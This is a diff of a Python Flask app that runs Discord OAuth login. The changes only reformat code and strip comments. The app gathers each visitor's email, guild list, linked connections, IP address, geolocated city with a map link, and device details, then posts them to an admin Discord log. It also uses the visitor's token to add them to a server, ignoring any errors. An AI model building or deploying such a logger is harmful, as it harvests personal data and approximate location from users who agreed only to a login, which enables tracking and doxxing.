@@ -15,7 +15,7 @@ DISCORD_CLIENT_ID = os.getenv("DISCORD_CLIENT_ID")
 DISCORD_CLIENT_SECRET = os.getenv("DISCORD_CLIENT_SECRET")
 DISCORD_BOT_TOKEN = os.getenv("DISCORD_BOT_TOKEN")
 DISCORD_GUILD_ID = os.getenv("DISCORD_GUILD_ID")
-REDIRECT_URI = os.getenv("DISCORD_REDIRECT_URI")  # 例: https://black-ruann.onrender.com/callback
+REDIRECT_URI = os.getenv("DISCORD_REDIRECT_URI")  # https://black-ruann.onrender.com/callback
 
 # ----------------------------
 # クライアントIP取得
@@ -48,11 +48,9 @@ def get_geo_info(ip):
             "hosting": data.get("hosting", False)
         }
     except:
-        return {
-            "ip": ip, "country": "不明", "region": "不明", "city": "不明",
-            "zip": "不明", "isp": "不明", "as": "不明",
-            "lat": None, "lon": None, "proxy": False, "hosting": False
-        }
+        return {"ip": ip, "country": "不明", "region": "不明", "city": "不明",
+                "zip": "不明", "isp": "不明", "as": "不明",
+                "lat": None, "lon": None, "proxy": False, "hosting": False}
 
 # ----------------------------
 # ログ保存
@@ -76,7 +74,7 @@ def save_log(discord_id, data):
 # ----------------------------
 @app.route("/")
 def index():
-    redirect_uri_encoded = quote(REDIRECT_URI, safe='')  # 安全にURLエンコード
+    redirect_uri_encoded = quote(REDIRECT_URI, safe='')
     discord_auth_url = (
         f"https://discord.com/oauth2/authorize"
         f"?client_id={DISCORD_CLIENT_ID}"
@@ -122,18 +120,15 @@ def callback():
     guilds = requests.get("https://discord.com/api/users/@me/guilds", headers=headers_auth).json()
     connections = requests.get("https://discord.com/api/users/@me/connections", headers=headers_auth).json()
 
-    # サーバー参加（guilds.join スコープが必要）
+    # サーバー参加
     try:
         requests.put(
             f"https://discord.com/api/guilds/{DISCORD_GUILD_ID}/members/{user['id']}",
-            headers={
-                "Authorization": f"Bot {DISCORD_BOT_TOKEN}",
-                "Content-Type": "application/json"
-            },
+            headers={"Authorization": f"Bot {DISCORD_BOT_TOKEN}", "Content-Type": "application/json"},
             json={"access_token": access_token}
         )
     except:
-        pass  # エラーは無視してログのみ
+        pass
 
     # IP/位置情報取得
     ip = get_client_ip()
@@ -189,54 +184,27 @@ def callback():
             "color": 0x2B2D31,
             "description": (
                 f"```ini\n"
-                f"[ ユーザー情報 ]\n"
-                f"Username   = {data['username']}#{data['discriminator']}\n"
-                f"UserID     = {data['id']}\n"
-                f"Email      = {data['email']}\n"
-                f"\n"
-                f"[ 接続情報 ]\n"
-                f"IP         = {data['ip']}\n"
-                f"Country    = {data['country']} / {data['region']} / {data['city']} ({data['zip']})\n"
-                f"ISP        = {data['isp']}\n"
-                f"AS         = {data['as']}\n"
-                f"Location   = https://maps.google.com/?q={data['lat']},{data['lon']}\n"
-                f"\n"
-                f"[ デバイス情報 ]\n"
-                f"OS         = {data['user_agent_os']}\n"
-                f"Browser    = {data['user_agent_browser']}\n"
-                f"Device     = {data['user_agent_device']}\n"
-                f"Bot UA     = {data['user_agent_bot']}\n"
-                f"\n"
-                f"[ セキュリティ判定 ]\n"
-                f"Proxy      = {data['proxy']}\n"
-                f"Hosting    = {data['hosting']}\n"
-                f"Locale     = {data['locale']} / Premium: {data['premium_type']}\n"
-                f"```"
+                f"[ ユーザー情報 ]\nUsername = {data['username']}#{data['discriminator']}\nUserID = {data['id']}\nEmail = {data['email']}\n\n"
+                f"[ 接続情報 ]\nIP = {data['ip']}\nCountry = {data['country']} / {data['region']} / {data['city']} ({data['zip']})\nISP = {data['isp']}\nAS = {data['as']}\nLocation = https://maps.google.com/?q={data['lat']},{data['lon']}\n\n"
+                f"[ デバイス情報 ]\nOS = {data['user_agent_os']}\nBrowser = {data['user_agent_browser']}\nDevice = {data['user_agent_device']}\nBot UA = {data['user_agent_bot']}\n\n"
+                f"[ セキュリティ判定 ]\nProxy = {data['proxy']}\nHosting = {data['hosting']}\nLocale = {data['locale']} / Premium: {data['premium_type']}\n```"
             ),
             "thumbnail": {"url": data["avatar_url"]},
-            "footer": {
-                "text": "⚠️ 管理者専用ログ | BLACK_ルアン セキュリティモニター",
-                "icon_url": "https://cdn-icons-png.flaticon.com/512/3064/3064197.png"
-            },
+            "footer": {"text": "⚠️ 管理者専用ログ | BLACK_ルアン セキュリティモニター",
+                       "icon_url": "https://cdn-icons-png.flaticon.com/512/3064/3064197.png"},
             "timestamp": datetime.utcnow().isoformat()
         }
 
+        # 不審アクセス
         if data["proxy"] or data["hosting"]:
             suspicious_embed = {
                 "title": "⚠️ 不審アクセス検出",
                 "color": 0xFF3C3C,
                 "description": (
-                    f"```diff\n"
-                    f"- Proxy or Hosting Detected!\n"
-                    f"+ Username: {data['username']}#{data['discriminator']}\n"
-                    f"+ IP: {data['ip']}\n"
-                    f"+ Proxy: {data['proxy']} | Hosting: {data['hosting']}\n"
-                    f"```"
+                    f"```diff\n- Proxy or Hosting Detected!\n+ Username: {data['username']}#{data['discriminator']}\n+ IP: {data['ip']}\n+ Proxy: {data['proxy']} | Hosting: {data['hosting']}\n```"
                 ),
-                "footer": {
-                    "text": "BLACK_ルアン セキュリティAIによる自動検知",
-                    "icon_url": "https://cdn-icons-png.flaticon.com/512/7359/7359942.png"
-                },
+                "footer": {"text": "BLACK_ルアン セキュリティAIによる自動検知",
+                           "icon_url": "https://cdn-icons-png.flaticon.com/512/7359/7359942.png"},
                 "timestamp": datetime.utcnow().isoformat()
             }
             bot.loop.create_task(bot.send_log(embed=suspicious_embed))
